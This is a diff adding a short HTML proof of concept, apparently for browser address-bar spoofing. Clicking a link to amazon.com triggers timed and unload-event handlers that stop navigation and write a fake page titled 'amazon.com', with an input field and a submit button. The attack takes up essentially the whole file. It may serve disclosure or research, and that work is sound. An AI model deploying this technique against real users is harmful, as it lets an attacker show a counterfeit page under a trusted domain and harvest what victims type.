@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>spoof</title>
+</head>
+<body>
+
+click <a href="https://www.amazon.com/" id="spoof" onclick="return go()">spoof</a>
+
+<script>
+var POC = '<!doctype html><html><head><meta charset="utf-8">'
+  + '<meta name="viewport" content="width=device-width, initial-scale=1"><title>amazon.com</title></head>'
+  + '<body><h1>Ini Bukan Asli</h1>'
+  + 'Spoof here <input type="text"> <button onclick="return false">Submit</button>'
+  + '</body></html>';
+
+function inject(){
+  try { window.stop(); } catch(e){}
+  try { document.open(); document.write(POC); document.close(); } catch(e){}
+}
+
+function go(){
+  // Strategy: rapid-fire interval (every 16ms) tries to catch
+  // the brief gap between bar-flip and page-commit.
+  // Also fires fixed delays as backup.
+  // The interval approach survives as long as the JS context is alive.
+  var iv = setInterval(function(){
+    inject();
+    clearInterval(iv);
+  }, 16);
+
+  // Backup: pagehide fires when leaving the page
+  window.addEventListener('pagehide', function(){
+    inject();
+  });
+
+  // Backup: beforeunload fires even earlier
+  window.addEventListener('beforeunload', function(){
+    inject();
+  });
+
+  // Allow the anchor navigation to amazon.com
+  return true;
+}
+</script>
+
+</body>
+</html>
